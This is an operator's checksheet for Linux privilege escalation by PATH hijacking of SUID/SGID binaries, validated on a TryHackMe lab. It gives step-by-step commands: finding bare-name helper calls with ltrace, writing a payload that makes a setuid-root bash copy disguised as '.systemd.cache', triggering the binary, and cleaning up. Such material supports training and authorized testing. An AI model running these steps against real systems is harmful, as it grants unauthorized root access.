
⚠️ **PATH hijack of a SUID/SGID binary that invokes a helper by bare name.** A helper script lands on disk; the binary runs it as root, creating a setuid-root shell copy. Both artefacts persist — higher IOC than live-off-the-land.

⚠️ **SGID (not SUID) yields the effective _group_, not root** — see [[#SGID candidates]].

---

## Step 1 — Self-select a candidate

⚠️ Candidate list = the SUID/SGID `find` output from [[Linux Privilege Escalation Checksheet]] Step 9. If absent, return there first.

For each candidate `<binary>`, reveal any helper command it invokes:

`timeout 10 ltrace -f <binary> </dev/null 2>&1 | grep -oE '(system|popen|execlp|execvp)\("[^"]+"'`

(no `ltrace` → **No fallback method yet built, both `strace` and `strings` presented severe limitations** - build canonical fallback method when encountered (HTB, PG etc.))

Each hit shows an invoked command; `<cmd>` = the first whitespace-delimited token of the quoted string. Example output: `system("service apache2 start"`, here `<cmd>` = `service`. 

- `<cmd>` has **no leading `/`** (e.g. `service`) → PATH-hijackable → **record `<cmd>`** → Step 2.
- `<cmd>` is an **absolute path** (e.g. `/usr/sbin/service`) → not PATH-hijackable by this technique  → next candidate. 

List exhausted → return to [[Linux Privilege Escalation Checksheet]] Step 9. 

---

## Step 2 — Build the malicious `<cmd>` script and place it

Find a writable + executable directory (`<hijack_dir>`). Probe `/tmp` first:

`d=/tmp; printf '#!/bin/sh\ntrue\n' > "$d/.p" && chmod +x "$d/.p" && "$d/.p" && echo "EXEC OK" ; rm -f "$d/.p"`

- `EXEC OK` → `<hijack_dir>` is the probed directory.
- No output → set `d=/dev/shm`, then `d=/var/tmp`, then `d="$HOME"` and re-run (**one at a time**); first that prints `EXEC OK` is `<hijack_dir>`.
- None → return to [[Linux Privilege Escalation Checksheet]] Step 9.

Write the payload as `<cmd>` in `<hijack_dir>` and mark it executable:

`printf '#!/bin/sh\ncp /bin/bash <hijack_dir>/.systemd.cache && chmod 4755 <hijack_dir>/.systemd.cache\n' > <hijack_dir>/<cmd> && chmod +x <hijack_dir>/<cmd>`

→ Step 3

---

## Step 3 — Trigger + verify

Run the SUID binary with `<hijack_dir>` first on PATH (one-shot, this execution only):

`PATH=<hijack_dir>:$PATH <binary>`

The `<binary>` runs `<cmd>` in its privileged context, creating a setuid-root `<hijack_dir>/.systemd.cache`. Launch it from your own terminal and verify:

`<hijack_dir>/.systemd.cache -p`

`id`

- `euid=0(root)` → root achieved. Effective UID is 0; real UID remaining as the original user is expected for SUID bash with `-p`.
- `<hijack_dir>/.systemd.cache` absent / `euid` unchanged → the binary sanitised PATH before the call, never ran `<cmd>`, or isn't SUID-root → next candidate.
- SGID binary → see [[#SGID candidates]] (the copy must be `chmod 2755`, and `id` shows `egid=<group>`, not `euid=0`).

---

## Decision

Root shell achieved. Next steps are goal-dependent; common destinations:

- Credential extraction → [[Linux Credential Extraction Checksheet]]
- Persistence → [[Linux Persistence Checksheet]]
- Lateral movement → [[Linux Lateral Movement Checksheet]]

---

## Cleanup

From the root shell, before you exit (the setuid copy is root-owned — your normal user can't delete it under a sticky `/tmp`), remove both artefacts:

`rm -f <hijack_dir>/.systemd.cache <hijack_dir>/<cmd>`

Then exit.

⚠️ The one-shot `PATH=` override does not persist — nothing to unset. The setuid binary running and the setuid-bash launch may be recorded by auditd / process accounting (`pacct`), and the freshly-created setuid-root file may trip file-integrity monitoring; log cleanup is out of scope.

---

## SGID candidates

For an SGID (not SUID) binary, the malicious `<cmd>` runs with `egid=<group>`, not `euid=0`. `setuid(0)` returns `-1` (no saved root to reclaim) — the win is the effective group; `system("/bin/bash -p")` preserves `egid` into the shell.

- Verify: `id` shows the new `egid=<group>`. No `egid` change → this binary drops the setgid privilege before exec; abandon it, next candidate (Step 1).
- Exploit per the group: e.g. `shadow` → read `/etc/shadow` → [[Readable Shadow]]; `disk` / `docker` → matching group-escalation route.

## Validation

THM:Linux PrivEsc:Task 13 SUID / SGID Executables — Environment Variables